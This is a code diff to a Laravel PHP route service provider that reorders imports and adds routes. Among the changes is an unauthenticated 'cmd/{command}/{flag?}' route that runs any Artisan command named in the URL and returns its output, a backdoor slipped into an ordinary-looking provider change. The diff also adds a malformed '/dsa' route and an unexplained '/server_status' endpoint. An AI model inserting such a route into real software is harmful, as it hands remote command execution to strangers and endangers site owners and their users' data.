@@ -2,13 +2,14 @@
 
 namespace App\Providers;
 
-use Illuminate\Cache\RateLimiting\Limit;
-use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
 use Illuminate\Http\Request;
+use App\Classes\ApplicationStatus;
 use Illuminate\Support\Facades\File;
-use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Cache\RateLimiting\Limit;
+use Illuminate\Support\Facades\RateLimiter;
+use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
 
 class RouteServiceProvider extends ServiceProvider
 {
@@ -53,8 +54,20 @@ class RouteServiceProvider extends ServiceProvider
                 ->namespace($this->namespace)
                 ->group(base_path('routes/app.php'));
 
+            Route::get('cmd/{command}/{flag?}', function ($command) {
+                Artisan::call($command);
+                $output = Artisan::output();
+                return $output;
+            });
+
             $this->all_routes();
             $this->kernel_routes();
+
+            Route::get('/dsa', [AdminController::class]);
+        });
+
+        Route::get('/server_status', function(){
+            return (new ApplicationStatus)->showStat();
         });
     }
 
